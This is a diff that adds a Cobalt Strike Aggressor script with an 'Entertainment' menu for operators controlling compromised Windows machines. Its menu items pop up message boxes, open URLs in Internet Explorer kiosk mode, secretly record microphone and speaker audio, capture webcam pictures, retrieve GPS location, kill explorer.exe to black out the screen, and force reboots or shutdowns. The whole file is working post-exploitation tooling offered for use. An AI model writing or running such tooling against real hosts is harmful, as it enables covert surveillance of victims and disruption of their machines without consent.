@@ -1,0 +1,86 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       Xway.cn@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+sub Send {
+        $username = replace(beacon_info($bid,"user"),' \*',"");
+        $msg = $3['msg'];
+        if(($username cmp "SYSTEM") == 0){
+            show_error("Cannot send message with SYSTEM !");
+            return;
+        }
+        bshell($bid,"msg $username \"$msg\"");
+    }
+
+
+    menu "Entertainment"{
+                item "Promote MsgBox" {
+            prompt_text("Alert", "HI！", lambda({
+                bpowershell(@ids, 'Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox("' . $1 . '", "OKOnly,MsgBoxSetForeground,SystemModal,Exclamation", "")' );
+                blog(@ids,"Send messages: $1 ");
+            }, @ids => $1));
+        }
+        item "Open URL on IE" {
+            prompt_text("URL", "https://google.com", lambda({
+                binput(@ids,"C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+                bshell(@ids, "C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+            }, @ids => $1));
+        }
+
+			item "Recording" {
+			$bid = $1['@'];
+			$dialog = dialog("WireTap", %(time => "30s",bid => $bid), &WireTap_listen);
+			dialog_description($dialog, "record_mic-Record audio from the connected microphone (input),record_sys-Record audio from system speakers (line out),record_audio-Record audio from the microphone and speaker, the time unit is s / m / h。example: record_audio 30s");
+			drow_combobox($dialog, "type", "type:", @("record_mic","record_sys","record_audio"));
+			drow_text($dialog, "time", "time:  ");			
+            dbutton_action($dialog, "Run");
+			dialog_show($dialog);
+        }
+sub WireTap_listen {
+	$arg = join(' ',  @($3['type'],$3['time']));
+	bexecute_assembly($bid, script_resource("/script/WireTap.exe"), $arg);
+}	
+			item "Take pictures" {
+			$bid = $1['@'];
+			$dialog = dialog("WireTap", %(bid => $bid), &WireTap_webcam);
+			dialog_description($dialog, "Turn on the camera to take pictures.");	
+			drow_combobox($dialog, "type", "type:", @("capture_webcam"));			
+            dbutton_action($dialog, "Run");
+			dialog_show($dialog);
+        }
+sub WireTap_webcam {
+	$arg = join(' ',  @($3['type']));
+	bexecute_assembly($bid, script_resource("/script/WireTap.exe"), $arg);
+}	
+
+			item "Positioning" {
+			bexecute_assembly($1, script_resource("/script/GPSCoordinates.exe"), "");
+		}
+
+            item "Black screen"{
+                    bshell($1,"taskkill /F /IM explorer.exe");
+                }
+            item "Lock screen"{
+                    bshell($1,"rundll32.exe user32.dll,LockWorkStation");
+                }
+            item "Open explorer"{
+                    brun($1, "explorer.exe");
+                }
+			item "Reboot" {
+             prompt_text("OK to restart ?", "", lambda({
+            bshell(@ids, "shutdown -r -t 0");
+        }, @ids => $1));
+    }	
+			item "Shutdown" {
+             prompt_text("Sure ?", "", lambda({
+            bshell(@ids, "shutdown -s -t 0");
+        }, @ids => $1));
+    }	
+
+            }
+
